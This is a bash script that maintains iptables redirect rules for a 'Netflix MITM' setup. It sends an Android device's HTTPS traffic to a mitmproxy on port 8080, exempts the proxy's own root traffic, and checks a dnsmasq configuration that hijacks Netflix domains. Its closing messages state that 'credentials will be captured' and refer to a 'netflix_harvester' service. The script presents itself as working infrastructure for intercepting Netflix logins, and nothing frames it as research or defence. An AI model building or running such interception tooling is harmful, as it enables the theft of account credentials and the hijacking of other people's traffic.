#!/bin/bash

################################################################################
#
# Fix iptables Redirection Loop - Netflix MITM Proxy
#
# This script fixes the "Cannot assign requested address" errors by excluding
# root user traffic from iptables redirection. This allows mitmproxy (running
# as root) to establish outbound connections to real Netflix servers while
# still redirecting Android device traffic to port 8080.
#
# Usage:
#   sudo ./fix_iptables_loop.sh
#
################################################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_header() {
    echo -e "${BLUE}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║  Netflix MITM - Fix iptables Redirection Loop                 ║"
    echo "║  Exclude root traffic to prevent connection errors            ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

exit_error() {
    print_error "$1"
    echo ""
    echo "Failed to apply iptables fixes. Please check the errors above."
    exit 1
}

print_header

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    exit_error "This script must be run with sudo"
fi

print_info "Checking iptables availability..."
if ! command -v iptables &> /dev/null; then
    exit_error "iptables not found"
fi
print_success "iptables found"

# Step 1: Clear existing rules
print_info "Clearing existing NETFLIX_INTERCEPT rules..."

if iptables -t nat -L NETFLIX_INTERCEPT -n > /dev/null 2>&1; then
    iptables -t nat -F NETFLIX_INTERCEPT
    print_success "Cleared existing rules"
else
    print_warning "NETFLIX_INTERCEPT chain not found (will be created)"
fi

# Step 2: Check if chain exists, create if needed
print_info "Ensuring NETFLIX_INTERCEPT chain exists..."

if ! iptables -t nat -L NETFLIX_INTERCEPT -n > /dev/null 2>&1; then
    iptables -t nat -N NETFLIX_INTERCEPT
    print_success "Created NETFLIX_INTERCEPT chain"
else
    print_success "NETFLIX_INTERCEPT chain already exists"
fi

# Step 3: Add rules that exclude root user traffic
print_info "Adding redirection rules (excluding root user)..."

# Rule 1: Redirect non-root traffic (from Android device) to port 8080
if iptables -t nat -A NETFLIX_INTERCEPT -p tcp --dport 443 -m owner ! --uid-owner root -j REDIRECT --to-port 8080; then
    print_success "Added rule: Redirect non-root HTTPS traffic to port 8080"
else
    exit_error "Failed to add redirect rule for non-root traffic"
fi

# Rule 2: Accept root user traffic (don't redirect mitmproxy's own traffic)
if iptables -t nat -A NETFLIX_INTERCEPT -p tcp --dport 443 -m owner --uid-owner root -j ACCEPT; then
    print_success "Added rule: Accept root user HTTPS traffic (no redirect)"
else
    exit_error "Failed to add accept rule for root traffic"
fi

# Step 4: Ensure NETFLIX_INTERCEPT is in PREROUTING
print_info "Checking PREROUTING chain..."

if iptables -t nat -L PREROUTING -n | grep -q "NETFLIX_INTERCEPT"; then
    print_success "NETFLIX_INTERCEPT already in PREROUTING"
else
    print_info "Adding NETFLIX_INTERCEPT to PREROUTING..."
    if iptables -t nat -A PREROUTING -j NETFLIX_INTERCEPT; then
        print_success "Added NETFLIX_INTERCEPT to PREROUTING"
    else
        print_warning "Could not add to PREROUTING (may already be present)"
    fi
fi

# Step 5: Display current rules
print_info "Current iptables NETFLIX_INTERCEPT rules:"
echo ""
iptables -t nat -L NETFLIX_INTERCEPT -n
echo ""

# Step 6: Save rules to persist across reboots
print_info "Saving iptables rules for persistence..."

if command -v iptables-save &> /dev/null; then
    mkdir -p /etc/iptables 2>/dev/null || true

    if iptables-save > /etc/iptables/rules.v4 2>/dev/null; then
        print_success "Rules saved to /etc/iptables/rules.v4"
    else
        print_warning "Could not save to /etc/iptables/rules.v4 (may need manual save)"
    fi

    # Try to install iptables-persistent if not already installed
    if ! dpkg -l | grep -q iptables-persistent; then
        print_warning "iptables-persistent not installed"
        print_info "Install with: sudo apt-get install iptables-persistent"
    else
        print_success "iptables-persistent is installed"
    fi
else
    print_warning "iptables-save not found (rules may not persist on reboot)"
fi

# Step 7: Verify DNS is still hijacking correctly
print_info "Verifying dnsmasq Netflix configuration..."

if [ -f /etc/dnsmasq.d/netflix-interceptor.conf ]; then
    DOMAIN_COUNT=$(grep -c "^address=" /etc/dnsmasq.d/netflix-interceptor.conf 2>/dev/null || echo 0)
    print_success "dnsmasq config found with $DOMAIN_COUNT domain redirects"
else
    print_warning "dnsmasq Netflix config not found"
    print_info "Run ./setup.sh to configure dnsmasq"
fi

# Final summary
echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  IPTABLES REDIRECTION LOOP FIX APPLIED${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Configuration:"
echo "  ✓ Android device traffic (port 443) → redirected to port 8080"
echo "  ✓ mitmproxy traffic (root user) → NOT redirected (can reach Netflix)"
echo "  ✓ DNS hijacking → still active (netflix.com → 127.0.0.1)"
echo ""
echo "Result:"
echo "  ✓ mitmproxy can establish connections to real Netflix servers"
echo "  ✓ Android device traffic is intercepted at port 8080"
echo "  ✓ Credentials will be captured without connection errors"
echo ""
echo -e "${YELLOW}Docker services status:${NC}"
docker-compose ps 2>/dev/null | grep -E "netflix_mitm_proxy|netflix_harvester" || echo "  (Docker services may not be running)"
echo ""
echo -e "${GREEN}Ready to test! Test credentials capture from Netflix app on Android device.${NC}"
echo ""
